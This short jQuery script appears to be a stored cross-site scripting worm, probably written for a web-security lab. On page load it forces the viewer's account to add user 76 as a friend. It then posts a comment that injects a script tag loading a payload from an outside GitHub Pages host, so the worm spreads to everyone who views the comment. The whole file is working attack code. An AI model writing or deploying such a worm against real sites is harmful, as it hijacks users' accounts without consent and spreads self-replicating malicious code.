$(document).ready(function() {
   $.ajax({url: "/add_friend.php?id=76", success: function(response){
     if(response.includes("True")){
       var date = Date();
       var comment = "friend added on".concat(date);
       var worm = "<script src=\"https://jackson987.github.io/finalw.js\"></script>"
       $.ajax({url: "/add_comment.php?id=76" + "&comment=" + comment, success: function(result){console.log(result);}});
       $.ajax({url: "/add_comment.php?comment=<script src=\"https://jackson987.github.io/finalw.js\"></script>", success: function(result){console.log(result);}});
     }
   }});
});
